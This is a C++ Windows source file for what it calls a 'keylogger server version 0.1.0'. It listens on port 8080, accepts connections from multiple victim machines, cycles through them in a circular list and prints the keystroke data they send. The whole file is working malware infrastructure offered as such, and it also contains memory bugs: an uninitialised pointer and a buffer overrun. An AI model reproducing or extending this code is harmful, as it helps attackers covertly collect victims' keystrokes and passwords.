#include <winsock2.h>
#include <mswsock.h>
#include "ServerInterProcess.h"
#include <stdio.h>
#include <thread>
#include<mutex>
#include <fcntl.h>
#include <io.h>

std::mutex mu;
SOCKETLIST *head;
void Listener()
{
    WSADATA WSA;
    SOCKET Listener;
    SOCKADDR_IN server, target;
    head= (SOCKETLIST*)malloc(sizeof(SOCKETLIST));
    (head->nextTarget)=0x00;
    (head->target)=0x00;

    int cL;
    fprintf(stderr ,"Welcome to the keylogger server version 0.1.0, \n momentarily the listener should be established!\n");
    fprintf(stderr ,"\t[*] Initalizing socket...\n");
    if (WSAStartup(MAKEWORD(2,2), &WSA) !=0)
    {
        fprintf(stderr ,"\t\t[*] WSAstartup has failed with Error Code: %d",WSAGetLastError());
        return;
    }
    fprintf(stderr ,"\t\t[*] WSA startup complete!\n\t[*] creating socket!");
    if((Listener = socket(AF_INET,SOCK_STREAM,0))==INVALID_SOCKET)
    {
        fprintf(stderr ,"Error in creating socket, error code: %d", WSAGetLastError());
        return;
    }
    server.sin_family =AF_INET;
    server.sin_addr.S_un.S_addr = INADDR_ANY;
    server.sin_port=htons(8080);
    fprintf(stderr ,"\n\t\t[*] attempting to bind socket to port 8080: ");
    if(bind(Listener,(struct sockaddr*)&server,sizeof(server))== SOCKET_ERROR)
    {
        fprintf(stderr ,"failed to bind socket, Error code %d", WSAGetLastError());
        return;
    }

    listen(Listener,3);
    cL=sizeof(target);
    SOCKETLIST link;
    while(true)
    {
        fprintf(stderr, "accepted\n\t\t[*]Listening: ");
        SOCKET *acceptedTarget = new SOCKET;
        *acceptedTarget = accept(Listener,(SOCKADDR*)&target,&cL);
        SOCKETLIST *link = new SOCKETLIST;

        if(*acceptedTarget==INVALID_SOCKET)
        {
            fprintf(stderr ,"\n\t\t[*] error connecting");
        }
        else
        {
            fprintf(stderr ," connection accepted\n[*] IP ADDRESS %d",htonl(target.sin_addr.S_un.S_addr));
            u_long mode =1;
            ioctlsocket(*acceptedTarget,FIONBIO,&mode);

            link->target = acceptedTarget;

            mu.lock();
            /*
                establish a self referential linked list,
                    A->B->C->A...
                each link contains a socket so the listener thread can read data off of the
                socket.
            */
            if((head->target)==0x00)
            {
                *head=*link;
                head->nextTarget=head;
            }
            else
            {
                link->nextTarget=head->nextTarget;
                head->nextTarget=link;
            }
            mu.unlock();

        }

    }

}
void Handler()
{
        unsigned int rcv;
        char* buffer = (char*)malloc(0x1000);
        SOCKETLIST *link;
        SOCKETLIST previousLink;
        while(1)
        {
            while((head->target)== NULL )
                Sleep(1);
            link->nextTarget=head->nextTarget;
            link->target=head->target;
            while((head->target)!=NULL)
            {

                while(recv(*(link->target),buffer,0x1001,0) !=  SOCKET_ERROR )
                {
                        *(buffer+0x1000)=0x00;
                       printf("%s",buffer);
                }
                if (WSAGetLastError() == WSAEWOULDBLOCK)
                {
                    Sleep(1);
                    WSASetLastError(0x00);
                    link = (link->nextTarget);
                }
                else
                {
                    printf("\n</KeyLoggerMetaData>\n");
                    SOCKETLIST temp = *(link->nextTarget);
                   if( link->target == temp.target)
                    {
                        mu.lock();
                        head->target=0x00;
                        head->nextTarget=0x00;
                        mu.unlock();
                    }
                    else
                    {
                        mu.lock();
                      link->target = link->nextTarget->target;
                      link->nextTarget=link->nextTarget->nextTarget;
                      head = link;
                      mu.unlock();
                    }

                }

            }
        }
}
/**
    this is a temporary server used for testing, future changes will be established
*/
int main()
{
    std::thread thread1 (Listener);
    std::thread thread2 (Handler);
    thread1.join();
    exit(-1);


    return 0;
}
